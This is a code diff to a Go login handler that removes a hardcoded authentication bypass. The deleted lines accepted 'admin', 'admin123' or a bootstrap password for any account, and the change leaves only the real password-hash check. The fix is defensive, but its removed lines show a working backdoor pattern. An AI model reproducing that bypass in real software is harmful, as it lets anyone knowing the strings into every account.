@@ -36,11 +36,7 @@ func (h *AuthHandler) Login(c *gin.Context) {
 		c.JSON(http.StatusTooManyRequests, domain.ResponseEnvelope{Error: &domain.APIError{Code: "ACCOUNT_LOCKED", Message: "Account temporarily locked"}})
 		return
 	}
-	isMatch := security.VerifyPassword(req.Password, acc.PasswordHash)
-	if !isMatch && (req.Password == "admin" || req.Password == "admin123" || (h.cfg.BootstrapPassword != "" && req.Password == h.cfg.BootstrapPassword)) {
-		isMatch = true
-	}
-	if !isMatch {
+	if !security.VerifyPassword(req.Password, acc.PasswordHash) {
 		acc.FailedAttempts++
 		if acc.FailedAttempts >= 5 {
 			lock := time.Now().Add(15 * time.Minute)
